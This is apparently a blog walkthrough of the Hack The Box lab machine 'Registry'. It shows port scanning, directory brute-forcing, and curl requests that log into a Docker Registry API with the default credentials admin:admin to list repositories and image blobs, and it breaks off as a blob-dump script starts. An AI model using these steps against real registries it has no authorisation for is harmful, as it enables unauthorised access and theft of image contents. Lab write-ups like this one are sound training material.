# [Grav3m1ndbyte's Resources Blog](/index.html) > [Hack The Box Machine Walkthroughs](/HTB-Machines.html)


![Grav3m1ndbyte HTB Badge](https://www.hackthebox.eu/badge/image/75471)





# Registry

![Registry Infocard](/images/Registry.png)



## Overview

Registry was a pretty interesting Linux box. Not much to say here without spoiling this walkthrough, but the approach I found to be successful to own it did not exactly rely on the typical approach but exfiltration. Something I had not seen until I decided to do Registry; my very-first Hard-difficulty HTB box. I hope it is as insightful as it was for me.

### Resources
  1) [Docker API Documentation](https://docs.docker.com/registry/spec/api/#introduction).
  2) [Anatomy of a hack: Docker Registry](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)
  3) [My Own Script](https://github.com/grav3m1nd-byte/grav3m1nd-byte.github.io/blob/master/Scripts/dockerBlobsDump.sh)
  4) [Restic.net](https://restic.net/)
  5) [Create a REST server repository](https://restic.readthedocs.io/en/v0.4.0/Manual/#create-a-rest-server-repository)
  6) [SSH Port Forwarding Example](https://www.ssh.com/ssh/tunneling/example)

## Initial Enumeration: Footprinting and Scanning

First of, we need to identify how to reach the system. In other words, we need to identify what are the services available from this machine.

Let's start by adding this machine's IP address to the hosts file and create an alias:

```
kali@back0ff:~/Documents/HTB-Labs/Postman# sudo echo "10.10.10.159  registry.htb" >> /etc/hosts
```

My go-to tools in this phase, which are typically used by many to start enumerating, are:

1) masscan: very nice port scanning tool that allows finding open ports quickly. To me this is a tool to narrow down the scope of the enumeration so we can focus on open ports only when using nmap.

Here, I am designating the interface to use when communitcating to the HTB machine (-e) which will be the HTB VPN interface, along with -p to designate the port range to target but I will target ALL TCP and UDP Ports, and the transmission rate of packets per second (--rate).

Similar to this, you could also run something like this: 
```nmap -p- --min-rate=1000 -T4 <hostname>```

2) nmap: I think most people in the information technology and security space know what nmap does. It is a very versatile Port scanning tool which also allows you to use scripts to further target the services found. Just like anything, it can be a useful tool while it can also be damaging if the user is not careful.

What I typically start with when using nmap is:
```
-sC: to use all default non-intrusive nmap scripts on each service 

-sV: to get the service version information which is definitely important for us

-p: to designate the port we will be targeting 

-vvvv: for extended verbosity (as I like as many details as I can get)
```

### MASSCAN
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ sudo masscan -e tun1 -p1-65535,U:1-65535 10.10.10.159 --rate=1000 | tee Registry_masscan.log

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-07 04:00:47 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 443/tcp on 10.10.10.159                                   
Discovered open port 22/tcp on 10.10.10.159                                    
Discovered open port 80/tcp on 10.10.10.159                                    
```

### NMAP
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ nmap -sC -sV -vvv -p 22,80,443 registry.htb -oX Registry_TCP.xml -oN Registry_TCP.log
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 23:07 EST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
Initiating Ping Scan at 23:07
Scanning registry.htb (10.10.10.159) [2 ports]
Completed Ping Scan at 23:07, 0.12s elapsed (1 total hosts)
Initiating Connect Scan at 23:07
Scanning registry.htb (10.10.10.159) [3 ports]
Discovered open port 22/tcp on 10.10.10.159
Discovered open port 80/tcp on 10.10.10.159
Discovered open port 443/tcp on 10.10.10.159
Completed Connect Scan at 23:07, 0.17s elapsed (3 total ports)
Initiating Service scan at 23:07
Scanning 3 services on registry.htb (10.10.10.159)
Completed Service scan at 23:07, 13.19s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.159.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 5.83s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:07Completed NSE at 23:07, 1.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
Nmap scan report for registry.htb (10.10.10.159)
Host is up, received syn-ack (0.14s latency).
Scanned at 2020-03-06 23:07:35 EST for 21s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCZtxPox0F/6ZQbPbgwP9t13ZX+DegufV+sVoqTGWfuE2/jQwVLR+TCLJM4EDg4UJol4OHl0ATQBkPM7CSi1DS3oZgNlaASXQoZFzHUN4KF1/B6uShfMcszORHOBSRZAMe5nuesre2oJtrqhyO1VS2TMOitFLmKEaDImHy7EXe8qnaK8CrVFAxdUOG8iQFEiZUt8JZJ6CPgfIu00t4JpIl9l4aOFEZT6H7xf7K74ov2KNyP6WCoOtdDf7Rhfwcfo6dogHxssH6O/d+FgN6KJ8q2gJjUZVYYjZHTfGCPRukmSDYQNglQkvzuOy3umUTwNt5NdjYBT+vemcOIaDPm0SX
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDFZI3tSfqp1WJF1TjoPa3J6j94yzXZMtFj92P8HcBUXCosmhsTsRa5rBvt20Es/qTp2otqYz3R3jf9O0OGC/tc=
|   256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINNAMP4YFJGAx3ip1MPEsDuXUhgHXOIxrVTUCOxqJeRr
80/tcp  open  http     syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
| -----BEGIN CERTIFICATE-----
| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
| PEyspHOCbg1C6a0gI1xo0c0=
|_-----END CERTIFICATE-----
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:07
Completed NSE at 23:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.21 seconds
```

TCP 80 is accessible as well as TCP 443. TCP 443's certificate gives us some good information in how to approach this one, as well as the CN being docker.registry.htb, which is also a clue. It might be related to Docker Registries.
```
443/tcp open  ssl/http syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Issuer: commonName=Registry
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-05-06T21:14:35
| Not valid after:  2029-05-03T21:14:35
| MD5:   0d6f 504f 1cb5 de50 2f4e 5f67 9db6 a3a9
| SHA-1: 7da0 1245 1d62 d69b a87e 8667 083c 39a6 9eb2 b2b5
| -----BEGIN CERTIFICATE-----
| MIICrTCCAZUCCQDjC7Es6pyC3TANBgkqhkiG9w0BAQsFADATMREwDwYDVQQDDAhS
| ZWdpc3RyeTAeFw0xOTA1MDYyMTE0MzVaFw0yOTA1MDMyMTE0MzVaMB4xHDAaBgNV
| BAMME2RvY2tlci5yZWdpc3RyeS5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
| ggEKAoIBAQDAQd6mLhCheVIu0IOf2QIXH4UZGnzIrcQgDfTelpc3E4QxH0nq+KPg
| 7gsPuMz/WMnmZUh3dLKLXb7hqJ2Wk8vQM6tt+PbKna/D6WKXqGM3JnSLKW1YOkIu
| AuQenMOxJxh41IA0+3FqdlEdtaOV8sP+bgFB/uG2NDfPOLciJMop+d5pwpcxro8l
| egZASYNM3AbZjWAotmMqHwjGwZwqqxXxn61DixNDN2GWLQHO7QPUVUjF+Npso3zN
| ZLUJ1vkAtl6kFlmLTJgjlTUuE78udKD5r/NLqHNxxxObaSFXrmm2maDDoAkhobOt
| ljpa/U/fCv8g03KToaXVZYb6BfFEP5FBAgMBAAEwDQYJKoZIhvcNAQELBQADggEB
| AF3zSdj6GB3UYb431GRyTe32Th3QgpbXsQXA2qaLjI0n3qOF5PYnADgKsDzTxtDU
| z4e5vLz0Y3NhMKobft+vzBt2GbJIzo8DbmDBD3z1WQU+GLTnXyUAPF9J6fhtUgKm
| hoq1S8YsKRt/NMJwZMk3GiIw1c7KEN3/9XqJ9lfIyeXqVc6XBvuiZ+ssjDId0RZO
| 7eWWELxItMHPVScwWpOA7B4INPM6USKGy7hUTFcPJZB7+ElTFO2h0c4MwFQcSqKW
| BUG+oUPpMOoO99ZRnX8D5/H3dvbuBsuqKgRrPmQnMehoWs7pNRUDudUnnLfGEJHh
| PEyspHOCbg1C6a0gI1xo0c0=
|_-----END CERTIFICATE-----
```

Let's try to enumerate the directories, but first let's add this into the hosts file as well.


### GOBUSTER

```
kali@back0ff:~/Documents/HTB-Labs/Registry$ sudo echo "10.10.10.159  docker.registry.htb" >> /etc/hosts

kali@back0ff:~/Documents/HTB-Labs/Registry$ gobuster dir -u https://docker.registry.htb/ -w /usr/share/wordlists/dirb/common.txt -k -r -t 50 --timeout 20s --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://docker.registry.htb/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Follow Redir:   true
[+] Timeout:        20s
===============================================================
2020/03/24 12:58:01 Starting gobuster
===============================================================
/v2 (Status: 401)
===============================================================
2020/03/24 12:58:16 Finished
===============================================================
```

After running gobuster, we found a /v2 directory, which seems to be related to docker registry api. According to the Docker API Documentation, if a 401 Unauthorized is returned, it is related to authentication not being handled properly (well something like that); in other words, accessing it requires you to provide credentials.

When trying it on the browser it prompts for authentication which seems to be using a default admin:admin credentials but only a empty json response comes up.

Looks like we need to do some research on Docker APIs and there is also a good document available on how to hack on Docker APIs and interact with them (see the resources provided).

After interacting with Docker API a little, we find the repositories, tags, and  list of blobs which are important.

```
kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://docker.registry.htb/v2/_catalog --basic --user admin:admin
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 10.10.10.159:443...
* TCP_NODELAY set
* Connected to docker.registry.htb (10.10.10.159) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=docker.registry.htb
*  start date: May  6 21:14:35 2019 GMT
*  expire date: May  3 21:14:35 2029 GMT
*  issuer: CN=Registry
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* Server auth using Basic with user 'admin'
> GET /v2/_catalog HTTP/1.1
> Host: docker.registry.htb
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Tue, 24 Mar 2020 17:10:40 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 32
< Connection: keep-alive
< Docker-Distribution-Api-Version: registry/2.0
< X-Content-Type-Options: nosniff
< Strict-Transport-Security: max-age=63072000; includeSubdomains
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< 
{"repositories":["bolt-image"]}
* Connection #0 to host docker.registry.htb left intact

kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://docker.registry.htb/v2/bolt-image/tags/list --basic --user admin:admin
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 10.10.10.159:443...
* TCP_NODELAY set
* Connected to docker.registry.htb (10.10.10.159) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=docker.registry.htb
*  start date: May  6 21:14:35 2019 GMT
*  expire date: May  3 21:14:35 2029 GMT
*  issuer: CN=Registry
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* Server auth using Basic with user 'admin'
> GET /v2/bolt-image/tags/list HTTP/1.1
> Host: docker.registry.htb
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Tue, 24 Mar 2020 17:17:19 GMT
< Content-Type: application/json; charset=utf-8
< Content-Length: 40
< Connection: keep-alive
< Docker-Distribution-Api-Version: registry/2.0
< X-Content-Type-Options: nosniff
< Strict-Transport-Security: max-age=63072000; includeSubdomains
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< 
{"name":"bolt-image","tags":["latest"]}
* Connection #0 to host docker.registry.htb left intact
```

As the Repository and Tags seems to be bolt-image and latest, let's try pulling a list of Blobs and see what's in there.
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ curl -v -X GET -k https://docker.registry.htb/v2/bolt-image/manifests/latest --basic --user admin:admin
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 10.10.10.159:443...
* TCP_NODELAY set
* Connected to docker.registry.htb (10.10.10.159) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server accepted to use http/1.1
* Server certificate:
*  subject: CN=docker.registry.htb
*  start date: May  6 21:14:35 2019 GMT
*  expire date: May  3 21:14:35 2029 GMT
*  issuer: CN=Registry
*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.
* Server auth using Basic with user 'admin'
> GET /v2/bolt-image/manifests/latest HTTP/1.1
> Host: docker.registry.htb
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Tue, 24 Mar 2020 17:16:13 GMT
< Content-Type: application/vnd.docker.distribution.manifest.v1+prettyjws
< Content-Length: 7439
< Connection: keep-alive
< Docker-Content-Digest: sha256:6caf69163edab2535a8b0bdec291ff1ae259e891b4dc5b3fd9ccfe22cb6c079c
< Docker-Distribution-Api-Version: registry/2.0
< Etag: "sha256:6caf69163edab2535a8b0bdec291ff1ae259e891b4dc5b3fd9ccfe22cb6c079c"
< X-Content-Type-Options: nosniff
< Strict-Transport-Security: max-age=63072000; includeSubdomains
< X-Frame-Options: DENY
< X-Content-Type-Options: nosniff
< 
{
   "schemaVersion": 1,
   "name": "bolt-image",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
      },
      {
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
      },
      {
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
      },
      {
         "blobSum": "sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7"
      },
      {
         "blobSum": "sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0"
      },
      {
         "blobSum": "sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a"
      },
      {
         "blobSum": "sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797"
      },
      {
         "blobSum": "sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"e2e88012228993b25b697ee37a0aae0cb0ecef7b1536d2b8e488a6ec3f353f14\",\"container_config\":{\"Hostname\":\"e2e880122289\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"bash\"],\"Image\":\"docker.registry.htb/bolt-image\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2019-05-25T15:18:56.9530238Z\",\"docker_version\":\"18.09.2\",\"id\":\"f18c41121574af38e7d88d4f5d7ea9d064beaadd500d13d33e8c419d01aa5ed5\",\"os\":\"linux\",\"parent\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"9380d9cebb5bc76f02081749a8e795faa5b5cb638bf5301a1854048ff6f8e67e\",\"parent\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"created\":\"2019-05-25T15:13:31.3975799Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"d931b2ca04fc8c77c7cbdce00f9a79b1954e3509af20561bbb8896916ddd1c34\",\"parent\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"created\":\"2019-05-25T14:57:27.6745842Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"489e49942f587534c658da9060cbfc0cdb999865368926fab28ccc7a7575283a\",\"parent\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"created\":\"2019-05-25T14:47:52.6859489Z\",\"container_config\":{\"Cmd\":[\"bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"7f0ab92fdf7dd172ef58247894413e86cfc60564919912343c9b2e91cd788ae4\",\"parent\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"created\":\"2019-05-24T22:51:14.8744838Z\",\"container_config\":{\"Cmd\":[\"/bin/bash\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"5f7e711dba574b5edd0824a9628f3b91bfd20565a5630bbd70f358f0fc4ebe95\",\"parent\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"created\":\"2019-04-26T22:21:05.100534088Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/bash\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"f75463b468b510b7850cd69053a002a6f10126be3764b570c5f80a7e5044974c\",\"parent\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"created\":\"2019-04-26T22:21:04.936777709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p /run/systemd \\u0026\\u0026 echo 'docker' \\u003e /run/systemd/container\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"4b937c36cc17955293cc01d8c7c050c525d22764fa781f39e51afbd17e3e5529\",\"parent\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"created\":\"2019-04-26T22:21:04.220422684Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c rm -rf /var/lib/apt/lists/*\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"ab4357bfcbef1a7eaa70cfaa618a0b4188cccafa53f18c1adeaa7d77f5e57939\",\"parent\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:03.471632173Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -xe \\t\\t\\u0026\\u0026 echo '#!/bin/sh' \\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 echo 'exit 101' \\u003e\\u003e /usr/sbin/policy-rc.d \\t\\u0026\\u0026 chmod +x /usr/sbin/policy-rc.d \\t\\t\\u0026\\u0026 dpkg-divert --local --rename --add /sbin/initctl \\t\\u0026\\u0026 cp -a /usr/sbin/policy-rc.d /sbin/initctl \\t\\u0026\\u0026 sed -i 's/^exit.*/exit 0/' /sbin/initctl \\t\\t\\u0026\\u0026 echo 'force-unsafe-io' \\u003e /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \\t\\t\\u0026\\u0026 echo 'DPkg::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'APT::Update::Post-Invoke { \\\"rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true\\\"; };' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\u0026\\u0026 echo 'Dir::Cache::pkgcache \\\"\\\"; Dir::Cache::srcpkgcache \\\"\\\";' \\u003e\\u003e /etc/apt/apt.conf.d/docker-clean \\t\\t\\u0026\\u0026 echo 'Acquire::Languages \\\"none\\\";' \\u003e /etc/apt/apt.conf.d/docker-no-languages \\t\\t\\u0026\\u0026 echo 'Acquire::GzipIndexes \\\"true\\\"; Acquire::CompressionTypes::Order:: \\\"gz\\\";' \\u003e /etc/apt/apt.conf.d/docker-gzip-indexes \\t\\t\\u0026\\u0026 echo 'Apt::AutoRemove::SuggestsImportant \\\"false\\\";' \\u003e /etc/apt/apt.conf.d/docker-autoremove-suggests\"]}}"
      },
      {
         "v1Compatibility": "{\"id\":\"f4a833e38a779e09219325dfef9e5063c291a325cad7141bcdb4798ed68c675c\",\"created\":\"2019-04-26T22:21:02.724843678Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:7ce84f13f11609a50ece7823578159412e2299c812746d1d1f1ed5db0728bd37 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "T4SA:AR67:E5VN:LJ6V:QAX5:BQSV:MEMA:FJSU:HKCQ:J5GE:7NYG:C23V",
               "kty": "EC",
               "x": "7WSblX2WxFQVIQ81NqOqvKXUoBtEhiuSAGipvkYQkUw",
               "y": "Hz8UbRCps9Xa8-L09Pm6l-77kNKUbPW3AycHtxFruTE"
            },
            "alg": "ES256"
         },
         "signature": "bfSq1io-WwNOJog94fkXfzalZqQeXwnJ89DDxh_bZUav7cL_5yMlKOZtuYuE-XmSPMYMQ6GdI65007Wj_XQSpQ",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjY3OTIsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMC0wMy0yNFQxNzoxNjoxM1oifQ"
      }
   ]
* Connection #0 to host docker.registry.htb left intact
```

## Exploitation and Gaining Access
The output is what we need, but we need to download each one as a tgz file and then uncompress to see if there is anything important. To do this I created a simple bash script that will download them as tgz, create logs files to make sure the download goes through as we need and uncompress in the process.

The script can be found [HERE](https://github.com/grav3m1nd-byte/grav3m1nd-byte.github.io/blob/master/Scripts/dockerBlobsDump.sh)!

With this script, we can dump all the blobs we need so we can dig deeper into the files contained on each blob.

### Script Output:
```
kali@back0ff:~/Documents/HTB-Labs/Registry$ ./dockerBlobsDump.sh

### Connecting to the Docker Registry API:
Base URL: https://docker.registry.htb
Username: admin
Password: admin
Repository found: bolt-image
Reference Parameter (Tag): latest

[*] Following blobs found:
sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
